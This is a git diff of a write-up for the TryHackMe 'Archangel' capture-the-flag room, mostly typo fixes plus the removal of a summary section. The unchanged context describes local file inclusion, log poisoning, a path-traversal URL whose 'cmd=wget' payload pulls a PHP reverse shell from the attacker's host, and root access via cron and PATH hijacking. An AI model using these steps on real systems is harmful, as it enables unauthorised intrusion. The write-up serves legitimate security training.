@@ -3,10 +3,11 @@
 ## Overview
 This write‑up covers the *Archangel* room on [TryHackMe](https://tryhackme.com), created by [Archangel](https://tryhackme.com/p/Archangel).
 
-The objective of this room is to gain root access to the target machine; To achieve this, several techniques are required, such as: Local File Inclusion (LFI), Remote File Inclusion (RFI) and privilege escalation through cron job abuse and PATH hijacking. In short, this box includes multiple classic attack vectors into a single challenge.
+The objective of this room is to gain root access to the target machine; To achieve this, several techniques are required.    
+In short, this box includes multiple classic attack vectors into a single challenge.
 
 ## Setup
-- **Tools used:** nmap, gobuster, cyberchef, python3 (http.server), netcat, wget, script, bash, php.
+- **Tools used:** nmap, gobuster, cyberchef, python3, netcat, wget, script, bash, php.
 - **Techniques:** Log poisoning, Reverse shell payloads, PATH hijacking, Cron Job abuse.
 - **Notes:** This room took me several days to complete, which is why some of the screenshots may show different IP addresses. It was a challenging experience, but working through each step helped me sharpen my skills and better understand the techniques involved.
 ---
@@ -67,13 +68,13 @@ Gobuster revealed a text document at `robots.txt` with a `200` response code.
 
 ![gobuster](media/7.png)
 
-Adding `/robots.txt` to the hostname url led me to a page that hinted at the presence of a test php file named `´test.php`.
+Adding `/robots.txt` to the hostname url led me to a page that hinted at the presence of a test php file named `test.php`.
 
 ![url with robots.txt](media/8.png)
 
 Navigating to it, it was possible to find a simple interface containing only text and a button.
 
-Upon clicking the button, the pages url, previously `http://<Target Domain>/test.php`, now, displayed `http://<Target Hostname>/test.php?view=/var/www/html/development_testing/mrrobot.php`
+Upon clicking the button, the page's url, previously `http://<Target Domain>/test.php`, now, displayed `http://<Target Hostname>/test.php?view=/var/www/html/development_testing/mrrobot.php`
 
 ![control is an illusion](media/9.png)
 
@@ -165,10 +166,6 @@ Fortunately, the `pentestmonkey PHP reverse shell` was already available on the 
 
 I then started a simple Python HTTP server on port 5555 to host the file:
 
-```bash
-python3 -m http.server 5555
-```
-
 ![all that is shown here](media/18.png)
 
 With the server running, I used the vulnerable `cmd` parameter to instruct the target to download the reverse shell via `wget`:
@@ -177,7 +174,7 @@ With the server running, I used the vulnerable `cmd` parameter to instruct the t
 http://<Target Domain>/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=wget http://IP:5555/shell.php
 ```
 
-To confirm the file was successfully retrieved, I ran another ls -l command through the same method. The output showed that `shell.php` was now present on the target.
+To confirm the file was successfully retrieved, I ran another `ls -l` command through the same method. The output showed that `shell.php` was now present on the target.
 
 ![shell on the website source code](media/19.png)
 
@@ -266,7 +263,7 @@ I created a malicious script named cp that simply spawned a root shell:
 
 ![evil cp command](media/32.png)
 
-I gave it execute permissions and executed it:
+I gave my `cp` script execute permissions and executed `backup`:
 
 ![chmod +x backup && ./backup](media/33.png)
 
@@ -275,12 +272,3 @@ This immediately dropped me into a root shell, enabling me to navigate to `/root
 ![root flag](media/34.png)
 
 ---
-
-## Final Notes
-
-#### This room highlights the following misconfigurations and/or weaknesses:
-
-- Local File Inclusion (LFI).
-- Log Poisoning → Remote Code Execution (RCE).
-- Unrestricted Cron Job.
-- Insecure SUID Binary.
